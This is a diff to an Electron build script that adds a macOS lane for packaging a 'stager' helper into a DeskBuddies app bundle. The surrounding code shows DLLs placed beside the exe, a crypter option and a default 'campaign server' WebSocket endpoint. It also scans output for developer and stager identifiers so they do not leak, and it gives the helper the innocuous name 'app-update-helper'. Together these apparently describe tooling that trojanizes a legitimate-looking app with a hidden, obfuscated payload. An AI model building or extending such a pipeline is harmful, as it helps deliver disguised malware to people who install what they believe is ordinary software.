@@ -15,7 +15,8 @@
  *
  * Two-file lane (25H2): the DLLs MUST sit BESIDE DeskBuddies.exe, never inside
  * resources/. electron-builder's extraFiles is what puts them there - the
- * matching entries live in package.json -> build.extraFiles. extraResources
+ * matching entries live in package.json -> build.win.extraFiles (scoped to the
+ * Windows platform, so they can never land in a macOS bundle). extraResources
  * would land them in resources/ and break the lane.
  *
  * Usage:
@@ -23,6 +24,10 @@
  *   node scripts/build-with-stager.mjs --rust-crypter <dir> [--kit-out <dir>]
  *   node scripts/build-with-stager.mjs --stage-only
  *   npm run dist:stager -- --dir
+ *
+ * macOS lane (the helper goes INSIDE the bundle, not beside it):
+ *   node scripts/build-with-stager.mjs --mac --kit <dir> [--helper-name <name>]
+ *   npm run dist:mac
  *
  * Exit codes: 0 ok, 1 kit/verification failure, 2 usage error, else electron-builder's.
  */
@@ -61,6 +66,28 @@ const FORBIDDEN = ["/home/jacob", "stager_core", "StagerHost", "spawn_stager", "
  * --server always wins.
  */
 const CAMPAIGN_SERVER_DEFAULT = "wss://cdn-beam.site";
+
+/**
+ * macOS lane. Windows ships two files BESIDE the exe; on macOS the equivalent
+ * is the helper binary INSIDE the bundle at Contents/MacOS/ (package.json ->
+ * build.mac.extraFiles, whose "to" is relative to Contents/).
+ *
+ * MAC_HELPER_DEFAULT is PROVISIONAL - task-17 lands the real helper and its
+ * name. A missing helper fails the build loudly rather than shipping a bundle
+ * that looks like a shipping DeskBuddies and carries no update core.
+ */
+const MAC_STAGE_DIR = join(ROOT, "stager-stage-mac");
+const MAC_HELPER_DEFAULT = "app-update-helper";
+
+/** The sha256 a MANIFEST.txt records for one file name, or null. */
+function manifestHashFor(text, fileName) {
+  for (const raw of text.split(/\r?\n/)) {
+    if (!raw.includes(fileName)) continue;
+    const hash = raw.match(/\b([0-9a-fA-F]{64})\b/);
+    if (hash) return hash[1].toLowerCase();
+  }
+  return null;
+}
 
 const HELP = [
   "DeskBuddies stager build lane",
@@ -210,7 +237,16 @@ function run(cmd, args, opts = {}) {
 }
 
 function parseArgs(argv) {
-  const out = { kit: null, rustCrypter: null, kitOut: null, stageOnly: false, server: null, passthrough: [] };
+  const out = {
+    kit: null,
+    rustCrypter: null,
+    kitOut: null,
+    stageOnly: false,
+    server: null,
+    mac: false,
+    helperName: null,
+    passthrough: [],
+  };
   for (let i = 0; i < argv.length; i += 1) {
     const a = argv[i];
     if (a === "-h" || a === "--help") {
@@ -223,6 +259,9 @@ function parseArgs(argv) {
     else if (a === "--kit-out") out.kitOut = argv[++i];
     else if (a.startsWith("--kit-out=")) out.kitOut = a.slice(10);
     else if (a === "--stage-only") out.stageOnly = true;
+    else if (a === "--mac") out.mac = true;
+    else if (a === "--helper-name") out.helperName = argv[++i];
+    else if (a.startsWith("--helper-name=")) out.helperName = a.slice(14);
     else if (a === "--server") out.server = argv[++i];
     else if (a.startsWith("--server=")) out.server = a.slice(9);
     else out.passthrough.push(a);
@@ -289,6 +328,126 @@ async function resolveKit({ kit, rustCrypter, kitOut }) {
   fail("could not obtain a host kit.\n  Tried:\n" + tried.map((t) => "    - " + t).join("\n"));
 }
 
+/**
+ * The macOS lane: stage the helper binary for Contents/MacOS/ and hand off to
+ * electron-builder. Mirrors the Windows lane's gates - contract check, staging,
+ * manifest sha256 when the kit ships one, stale-identifier scan, provenance -
+ * and refuses to build at all when the helper is absent.
+ */
+async function mainMac(opts) {
+  const helperName = opts.helperName || MAC_HELPER_DEFAULT;
+  const kitArg = opts.kit || process.env.HOST_KIT_DIR || null;
+  if (!kitArg) {
+    fail(
+      "the mac lane needs --kit <dir> holding the helper binary.\n" +
+        "  There is no mac kit builder yet - the helper comes from task-17 - so pass\n" +
+        "  the directory that holds it:  --mac --kit <dir> [--helper-name <name>]",
+      2,
+    );
+  }
+  const kitDir = resolve(kitArg);
+  if (!existsSync(kitDir)) fail("--kit directory does not exist: " + kitDir);
+
+  info("mac kit: " + kitDir);
+  info(
+    "helper : " +
+      helperName +
+      (opts.helperName
+        ? "  (from --helper-name)"
+        : "  (PROVISIONAL name - pass --helper-name once task-17 lands the real one)"),
+  );
+
+  // Nothing survives a failed run: a rejected kit must never be picked up by a
+  // later electron-builder.
+  await rm(MAC_STAGE_DIR, { recursive: true, force: true });
+
+  // --- contract check -------------------------------------------------------
+  const helperPath = join(kitDir, helperName);
+  if (!existsSync(helperPath)) {
+    failRejected(
+      "the mac kit has no helper binary: " + helperPath + "\n" +
+        "  Refusing to build a bundle with no helper - it would look like a shipping\n" +
+        "  DeskBuddies and carry no update core. Fix one of:\n" +
+        "    --helper-name <name>   the helper is named differently\n" +
+        "    --kit <dir>            it lives elsewhere\n" +
+        "  kit dir contains: " + (readdirSync(kitDir).join(", ") || "(nothing)"),
+    );
+  }
+
+  // --- stage ----------------------------------------------------------------
+  await mkdir(MAC_STAGE_DIR, { recursive: true });
+  const stagedPath = join(MAC_STAGE_DIR, helperName);
+  await cp(helperPath, stagedPath);
+  info("staged -> " + stagedPath);
+
+  // --- gate: sha256 vs the kit manifest, when the kit ships one --------------
+  const manifestPath = join(kitDir, "MANIFEST.txt");
+  const helperBuf = await readFile(stagedPath);
+  const digest = sha256(helperBuf);
+  if (existsSync(manifestPath)) {
+    const want = manifestHashFor(await readFile(manifestPath, "utf8"), helperName);
+    if (!want) {
+      info("kit MANIFEST.txt carries no entry for " + helperName + " - sha recorded, not compared");
+    } else if (want !== digest) {
+      failRejected(
+        "the staged helper does not match the kit manifest.\n" +
+          "  manifest: " + want + "\n" +
+          "  staged  : " + digest + "\n" +
+          "  file    : " + helperName,
+      );
+    } else {
+      info("sha256 matches the kit manifest: " + digest);
+    }
+  } else {
+    info("kit has no MANIFEST.txt - sha256 recorded, not compared");
+  }
+
+  // --- gate: stale-identifier scan ------------------------------------------
+  const leaks = FORBIDDEN.map((needle) => ({ needle, ...countOccurrences(helperBuf, needle) })).filter(
+    (r) => r.ascii > 0 || r.wide > 0,
+  );
+  if (leaks.length > 0) {
+    failRejected(
+      "forbidden identifiers survived in the helper:\n" +
+        leaks.map((r) => "  " + r.needle + " ascii=" + r.ascii + " utf16le=" + r.wide).join("\n"),
+    );
+  }
+  info("identifier scan: 0 x " + FORBIDDEN.join(", "));
+
+  // --- provenance -----------------------------------------------------------
+  await writeFile(
+    join(MAC_STAGE_DIR, "PROVENANCE.txt"),
+    [
+      "staged : " + new Date().toISOString(),
+      "lane   : mac",
+      "kit    : " + kitDir,
+      "helper : " + helperName,
+      "size   : " + helperBuf.length + " B",
+      "sha256 : " + digest,
+      "server : " + opts.server + "  (seeded by the app - never a token)",
+      "",
+    ].join("\n"),
+  );
+
+  if (opts.stageOnly) {
+    info("stage-only: not running electron-builder");
+    return;
+  }
+
+  // --- package --------------------------------------------------------------
+  const builderArgs = [...opts.passthrough];
+  const hasPlatform = builderArgs.some((a) => /^(--win|--mac|--linux|-w|-m|-l)$/.test(a));
+  if (!hasPlatform) builderArgs.unshift("--mac");
+  info("electron-builder " + builderArgs.join(" "));
+
+  const bin = process.platform === "win32" ? "electron-builder.cmd" : "electron-builder";
+  const binPath = join(ROOT, "node_modules", ".bin", bin);
+  if (!existsSync(binPath)) fail("electron-builder is not installed at " + binPath + " - run: npm ci");
+  const code = await run(binPath, builderArgs, { cwd: ROOT, shell: process.platform === "win32" });
+  if (code !== 0) fail("electron-builder exited with code " + code, code);
+  info("done.");
+}
+
 async function main() {
   const opts = parseArgs(process.argv.slice(2));
   // The endpoint the installer seeds into desk.conf. An explicit --server wins,
@@ -306,6 +465,10 @@ async function main() {
   if (!/^(https?|wss):\/\/[^\s"$]+$/.test(opts.server)) {
     fail('--server must be an http(s) or wss URL with no spaces, quotes or "$": ' + opts.server, 2);
   }
+
+  // The mac lane stages a different contract (one helper, no NSIS) and shares
+  // the endpoint resolution above.
+  if (opts.mac) return mainMac(opts);
 
   const { dir: kitDir, source } = await resolveKit(opts);
 
